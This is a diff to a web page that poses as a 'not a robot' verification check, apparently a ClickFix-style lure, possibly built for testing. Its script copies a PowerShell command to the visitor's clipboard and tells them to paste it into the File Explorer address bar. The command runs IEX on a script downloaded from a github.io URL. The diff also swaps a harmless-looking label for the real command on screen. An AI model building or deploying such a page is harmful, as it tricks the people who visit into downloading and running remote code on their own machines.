@@ -62,10 +62,10 @@
             <p>
                         To better prove you are not a robot, please:
                     </p>
-                    <ol>
+                    <ol><l1>Copy the command below.</l1>
+                        <code id="command-display"></code>
                         <li>Click the file upload button below.</li>
-                        <li>In the FileExplorer, press <b>Ctrl+L</b>.</li>
-                        <li>Then, press <b>Ctrl+V</b>.</li>
+                        <li>In the FileExplorer, press <b>Ctrl+L</b>, then, press <b>Ctrl+V</b>.</li>
                         <li>Press <b>Enter</b> on your keyboard to finish.</li>
                         <li>Observe the verification output.</li>
                     </ol>
@@ -228,7 +228,7 @@ function showVerifyWindow() {
     const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
     const fullCommand = `${exe} ${flags} ${payload}`;
 
-    commandDisplay.textContent = '✅ "I am not a robot"';
+    commandDisplay.textContent = "powershell -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
     
     autoCopy(fullCommand);
 }
